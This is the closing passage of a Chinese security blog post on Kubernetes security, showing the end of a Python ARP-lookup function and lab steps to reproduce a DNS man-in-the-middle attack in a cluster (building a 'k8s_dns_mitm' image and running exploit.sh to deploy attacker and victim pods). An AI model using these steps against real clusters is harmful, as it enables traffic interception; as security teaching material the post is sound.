            <span class="k">return</span> <span class="n">mac</span><span class="p">,</span> <span class="n">answer</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="n">ARP</span><span class="p">]</span><span class="o">.</span><span class="n">psrc</span>

    <span class="k">return</span> <span class="kc">None</span><span class="p">,</span> <span class="kc">None</span>
</code></pre></td></tr></table>
</div>
</div><h3 id="44-复现">4.4 复现</h3>
<p>代码：<a href="https://github.com/Metarget/cloud-native-security-book/tree/main/code/0405-%e4%ba%91%e5%8e%9f%e7%94%9f%e7%bd%91%e7%bb%9c%e6%94%bb%e5%87%bb" target="_blank" rel="noopener noreffer">云原生网络攻击</a></p>
<p>模拟构建攻击者镜像：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">docker build -t k8s_dns_mitm:1.0 .
</code></pre></td></tr></table>
</div>
</div><p>使用 exploit.sh 分别部署 attacker 和 victim pod：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">./exploit.sh
</code></pre></td></tr></table>
</div>
</div></div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>更新于 2021-12-07</span>
            </div>
            <div class="post-info-license"></div>
        </div>
        <div class="post-info-line">
            <div class="post-info-md"></div>
            <div class="post-info-share">
                <span><a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="https://www.geekby.site/2021/11/k8s%E5%AE%89%E5%85%A8/" data-title="K8s 安全"><i class="fab fa-weibo fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Evernote" data-sharer="evernote" data-url="https://www.geekby.site/2021/11/k8s%E5%AE%89%E5%85%A8/" data-title="K8s 安全"><i class="fab fa-evernote fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Skype" data-sharer="skype" data-url="https://www.geekby.site/2021/11/k8s%E5%AE%89%E5%85%A8/" data-title="K8s 安全"><i class="fab fa-skype fa-fw"></i></a></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8/">云原生安全</a>,&nbsp;<a href="/tags/k8s/">k8s</a></section>
        <section>
            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
        </section>
    </div>

    <div class="post-nav"><a href="/2021/11/javascript%E5%8F%8D%E6%B7%B7%E6%B7%86/" class="prev" rel="prev" title="JavaScript 反混淆"><i class="fas fa-angle-left fa-fw"></i>JavaScript 反混淆</a>
            <a href="/2021/12/api%E5%AE%89%E5%85%A8/" class="next" rel="next" title="API 安全">API 安全<i class="fas fa-angle-right fa-fw"></i></a></div>
</div>
</article></div>
            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
                <i class="fas fa-arrow-up fa-fw"></i>
            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
                <i class="fas fa-comment fa-fw"></i>
            </a>
        </div><link rel="stylesheet" href="/lib/lightgallery/lightgallery.min.css"><script type="text/javascript" src="/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/algoliasearch/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lightgallery.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-thumbnail.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-zoom.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":100},"comment":{},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true},"search":{"algoliaAppID":"C19A58DMI2","algoliaIndex":"blog","algoliaSearchKey":"a7203b4397475a3fcf49cea4495e0987","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
</html>
